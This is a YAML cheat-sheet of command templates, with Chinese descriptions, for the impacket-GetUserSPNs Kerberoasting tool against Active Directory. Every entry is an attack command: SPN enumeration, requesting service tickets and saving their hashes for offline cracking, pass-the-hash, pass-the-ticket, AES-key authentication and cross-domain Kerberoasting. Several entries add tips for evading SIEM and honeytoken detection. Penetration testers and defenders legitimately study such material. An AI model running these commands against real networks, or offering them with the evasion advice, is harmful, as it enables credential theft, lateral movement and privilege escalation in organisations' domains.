tool: impacket-getuserspns
tags: [pentest, security, active-directory, kerberos, kerberoasting, enumeration, exploitation]

actions:
  # === ENUMERATION ===
  - title: impacket-GetUserSPNs - 列出可用的 SPN
    desc: |
      对域中普通用户账户关联的服务主体名称（SPN）执行基础枚举。
      这是 Kerberoasting 攻击的主要侦察步骤，用于识别可对其请求票据的账户。
      它需要有效的域凭据，并通过 LDAP 查询域控制器以找出设置了“servicePrincipalName”属性的账户。
    command: "impacket-GetUserSPNs {{domain}}/{{username}}:{{password}} -dc-ip {{dc_ip}}"

  - title: impacket-GetUserSPNs - 隐蔽枚举
    desc: |
      通过移除显式的（servicePrincipalName=*）过滤器来修改 LDAP 查询，以避免被某些安全监控工具发现。
      此方法更隐蔽，但在非常大的 Active Directory 环境中会检索更多对象，可能导致内存占用过高或报错。
      当你怀疑环境正在监控标准 Kerberoasting 枚举模式时使用。
    command: "impacket-GetUserSPNs {{domain}}/{{username}}:{{password}} -dc-ip {{dc_ip}} -stealth"

  - title: impacket-GetUserSPNs - 仅列出计算机账户
    desc: |
      通过将对象类别改为“computer”来调整 LDAP 查询，搜索计算机账户而非用户账户。
      计算机账户通常具有难以破解的复杂随机密码，但在特定横向移动场景中仍可能有用。
      注意 Active Directory 默认可能将 LDAP 结果限制为 1000 个对象，较大的环境需要分页。
    command: "impacket-GetUserSPNs {{domain}}/{{username}}:{{password}} -dc-ip {{dc_ip}} -machine-only"

  # === EXPLOITATION (KERBEROASTING) ===
  - title: impacket-GetUserSPNs - 请求 TGS 进行 Kerberoasting
    desc: |
      为所有发现的服务账户请求票据授予服务（TGS）票据，并以兼容破解工具的格式输出。
      输出显示在终端中，可直接供 Hashcat（模式 13100）或 John the Ripper 使用。
      请注意短时间内请求大量票据是高信号事件，常会触发“蜜标”告警或 SIEM 检测。
    command: "impacket-GetUserSPNs {{domain}}/{{username}}:{{password}} -dc-ip {{dc_ip}} -request"

  - title: impacket-GetUserSPNs - 请求票据并保存到文件
    desc: |
      为所有符合条件的账户请求 TGS 票据，并将生成的哈希自动保存到指定的本地文件。
      这是捕获哈希进行离线破解的最高效方式，无需手动从终端输出复制粘贴。
      生成的文件将包含标准 Kerberoasting 格式（$krb5tgs$...）的哈希。
    command: "impacket-GetUserSPNs {{domain}}/{{username}}:{{password}} -dc-ip {{dc_ip}} -outputfile {{output_file|hashes.txt}}"

  - title: impacket-GetUserSPNs - 针对特定用户请求票据
    desc: |
      为按其用户名标识的单个特定服务账户请求 TGS 票据。
      这种有针对性的方法比请求域中每个账户的票据安静得多，有助于规避检测。
      如果你已在枚举阶段识别出高价值或可能易受攻击的服务账户，强烈推荐使用。
    command: "impacket-GetUserSPNs {{domain}}/{{username}}:{{password}} -dc-ip {{dc_ip}} -request-user {{target_service_user}}"

  # === AUTHENTICATION VARIATIONS ===
  - title: impacket-GetUserSPNs - 使用 NTLM 哈希认证
    desc: |
      使用 NTLM 哈希而非明文密码向域控制器认证（Pass-the-Hash）。
      哈希格式应为 LMHASH:NTHASH；如果只有 NT 哈希，请将 LM 部分写为 32 个零或按示例留空。
      当你已从内存或 SAM 数据库恢复用户哈希但无法解密为明文密码时，这是必需的。
    command: "impacket-GetUserSPNs {{domain}}/{{username}} -hashes {{hash}} -dc-ip {{dc_ip}} -request"

  - title: impacket-GetUserSPNs - 使用 Kerberos 票据（ccache）认证
    desc: |
      使用存储在 ccache 文件中的现有 Kerberos 票据授予票据（TGT）执行 SPN 查询和票据请求。
      运行此命令前必须将 KRB5CCNAME 环境变量设置为 .ccache 文件的路径。
      此方法适用于“Pass-the-Ticket”场景，或想避免在进程命令行中放置任何密码/哈希时。
    command: "impacket-GetUserSPNs -k -no-pass {{domain}}/{{username}} -dc-ip {{dc_ip}} -request"

  - title: impacket-GetUserSPNs - 跨域 Kerberoasting
    desc: |
      利用域信任关系，从用户所属域之外的其他域查询并请求 SPN。
      -target-domain 标志指定要攻击的域，而初始目标参数包含你当前的有效凭据。
      这是跨多域林进行横向移动和权限提升的关键技术。
    command: "impacket-GetUserSPNs {{current_domain}}/{{username}}:{{password}} -target-domain {{target_domain}} -dc-ip {{target_dc_ip}} -request"

  - title: impacket-GetUserSPNs - 使用 AES 密钥认证
    desc: |
      使用原始的 AES-128 或 AES-256 十六进制密钥进行 Kerberos 认证，而非密码或 NTLM 哈希。
      在 NTLM 被禁用或受限的环境中，这提供了更现代且有时必需的认证方式。
      AES 密钥通常从失陷主机的 LSASS 进程或本地密钥数据库中提取。
    command: "impacket-GetUserSPNs {{domain}}/{{username}} -aesKey {{hex_key}} -dc-ip {{dc_ip}} -request"